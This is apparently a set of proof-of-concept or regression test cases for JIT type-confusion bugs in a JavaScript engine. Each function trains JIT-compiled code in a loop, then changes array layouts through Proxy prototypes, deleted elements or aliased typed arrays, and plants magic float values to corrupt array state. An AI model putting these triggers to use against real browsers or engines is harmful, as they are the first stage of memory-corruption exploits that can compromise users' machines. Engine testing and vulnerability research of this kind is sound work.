function set(arr, value) {
    arr[0] = value;
}

function trigger(arr, buggy) {
    let tmp = [1.1];

    arr[0] = 1.1;
    let res = tmp.concat(buggy);
    arr[0] = 2.3023e-320;
}

function test0() {
    for (let i = 0; i < 0x10000; i++) {
        let tmp = [1.1];
        set(tmp, 2.2);
        trigger(tmp, [1.1]);
    }

    let buggy = [1.1];
    let arr = [1.1];
    arr.getPrototypeOf = Object.prototype.valueOf;

    buggy.__proto__ = new Proxy({}, arr);

    set(buggy, -5.3049894784e-314);

    trigger(arr, buggy);

    print(arr);
}
print("test0");
test0();

function func(a, b)
{
    a[0] = 1.1;
    a[0] = b[0];
}

function test1()
{
    var a = [1.1, 1.2];
    var ab = new ArrayBuffer(16);
    var b = new Float64Array(ab);
    var c = new Uint32Array(ab);

    b[0] = 1.1;
    b[1] = 1.2;
    for (var i = 0; i < 10000; ++ i)
        func(a, b);

    c[0] = 0x80000002;
    c[1] = 0x80000002;
    print(b[0])

    func(a, b);
    print(a)
}
print("test1");
test1();

function opt(arr, value) {
    arr.push(value); 
    arr[0] = 2.3023e-320;
}

function test2() {
    for (let i = 0; i < 0x10000; i++) {
        let tmp = [1.1, 2.2, 3.3];
        delete tmp[1];

        opt(tmp, 2.2);
    }

    let arr = [1.1];
    opt(arr, -5.3049894784e-314); // MAGIC VALUE!

    print(arr);
}
print("test2");
test2();

function f1(a, b)
{
	a[0] = 1.1;	
	a[0] = b[0];
}

function f2(a,b)
{
	[].concat(a[0]);
}

function test3()
{
	var a = [1.1, 1.2];
	var ab = new ArrayBuffer(16);
	var b = new Float64Array(ab);
	var c = new Uint32Array(ab);

	b[0] = 1.1;
	b[1] = 1.2;
	for (var i = 0; i < 10000; ++ i)
	{
        f1(a, b);
    }

	c[0] = 0x80000002;
	c[1] = 0x80000002;

	f1(a, b);
	
	a[1] = {};

	for (var i = 0; i < 10000; ++ i)
    {
        f2([{},{}],[{},{}]);
    }

	a.slice(0,0);
	f2(a,[{},{}]);
}
print("test3");
test3();

function jit(arr, value)
{
    arr[0] = 1.1;
    arr.push(value);
    arr[1] = 6.17651672645e-312;
}
    
function test4(){
    let arr = [1.1,2.2,3.3];
    
    for(let i = 0; i < 20000; i++){
        arr2 = [2,3,4,5,6.6,7,8,9];
        delete arr2[1];
        jit(arr2, 3.3);
    }
    
    jit(arr, -5.3049894784e-314);
    print(arr[1]);
}
print("test4");
test4();